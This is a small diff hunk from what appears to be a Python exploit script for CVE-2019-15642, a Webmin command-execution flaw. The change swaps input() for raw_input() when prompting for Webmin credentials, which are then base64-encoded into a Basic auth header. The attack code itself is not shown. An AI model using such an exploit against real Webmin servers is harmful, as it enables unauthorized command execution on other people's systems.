@@ -49,8 +49,8 @@ def CVE_2019_15642(url,auth_base64,cmd):
 
 if __name__ == '__main__':
     print (banner)
-    username=input("Please Input Webmin Username: ")
-    password=input("Please Input Webmin Password: ")
+    username=raw_input("Please Input Webmin Username: ")
+    password=raw_input("Please Input Webmin Password: ")
     auth = username+':'+password
     auth_base64 =  base64.b64encode(auth)
     print ('\n>>>Authorization: Basic %s\n' %auth_base64)
